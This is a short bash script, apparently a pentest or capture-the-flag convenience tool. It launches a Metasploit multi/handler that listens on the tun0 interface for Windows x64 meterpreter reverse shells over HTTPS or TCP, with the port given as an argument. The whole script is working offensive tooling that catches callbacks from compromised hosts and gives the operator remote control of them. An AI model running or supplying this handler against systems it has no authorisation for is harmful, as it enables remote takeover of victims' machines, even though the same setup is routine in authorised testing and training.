#!/bin/bash

# Check if enough arguments are provided
if [ "$#" -ne 2 ]; then
  echo "Usage: $0 <LPORT> <https|tcp>"
  exit 1
fi

LPORT=$1
PROTOCOL=$2

# Validate the protocol argument
if [ "$PROTOCOL" == "https" ]; then
  PAYLOAD="windows/x64/meterpreter/reverse_https"
elif [ "$PROTOCOL" == "tcp" ]; then
  PAYLOAD="windows/x64/meterpreter/reverse_tcp"
else
  echo "Invalid protocol. Use 'https' or 'tcp'."
  exit 1
fi

# Create the msfconsole command
msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT $LPORT; set PAYLOAD $PAYLOAD; run"

